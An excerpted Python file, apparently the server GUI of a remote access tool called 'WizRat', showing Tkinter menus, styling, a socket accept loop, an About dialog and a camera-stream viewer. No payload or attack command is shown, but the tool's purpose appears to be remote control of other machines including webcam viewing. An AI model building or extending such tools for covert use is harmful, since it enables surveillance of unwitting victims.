...
import time, threading, socket, webbrowser
import signal, atexit
import base64, pickle, struct, cv2
from config import *
...
class ServerGUI:
    def __init__(self, host, port):
        ...
        self.input_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5), ipady=2)
        ...
        self.file_menu.add_command(label="Save", command=self.save_to_file, accelerator="Ctrl+S")
        self.file_menu.add_command(label="Load", command=self.load_from_file, accelerator="Ctrl+O")
        self.file_menu.add_separator()
        self.file_menu.add_command(label="Clear", command=self.clear_text_area, accelerator="Ctrl+K")
        self.file_menu.add_command(label="New Output Area", command=self.new_text_area)
        self.file_menu.add_command(label="Reset Connection", command=self.reset_connection)
        self.file_menu.add_separator()
        self.file_menu.add_command(label="Exit", command=self.window.quit, accelerator="Ctrl+Q")
        ...
        self.view_menu.add_command(label="Reset View", command=self.reset_view, accelerator="Ctrl+R")
    ...
    def start_server(self):
        ...
        # Add styling tags
        self.text_area.tag_config("title", foreground="#00FFFF", background="black", font=("Courier", 40, "bold"))
        self.text_area.tag_config("subtitle", foreground="#00FF00", background="black", font=("Courier", 10, "italic"))
        self.text_area.tag_config("default", foreground="#00FF00", background="black")
        self.text_area.tag_config("server_info", foreground="#FFFF00", background="black", font=("Courier", 12))
    ...
    def accept_clients(self):
        while self.is_running:  # Use flag in the loop
            try:
                self.server_socket.settimeout(1)  # Add timeout to allow checking flag
...
class AboutDialog(tk.Toplevel):
    def __init__(self, parent):
        ...
        self.message_label = tk.Label(self, text="This is the Server GUI for WizRat application.\nVersion 0.6")
        self.message_label.pack(padx=10, pady=10)

        self.website_label = tk.Label(self, text="For more information, visit our website: www.bitmutex.com",
                    ...
                    while self.running:
                        try:
                            ...
                            if (key == 27 or  # ESC key
                                key == ord('q') or  # q key
                                cv2.getWindowProperty('WizRat Camera Server', cv2.WND_PROP_VISIBLE) < 1):  # Window closed
                                break
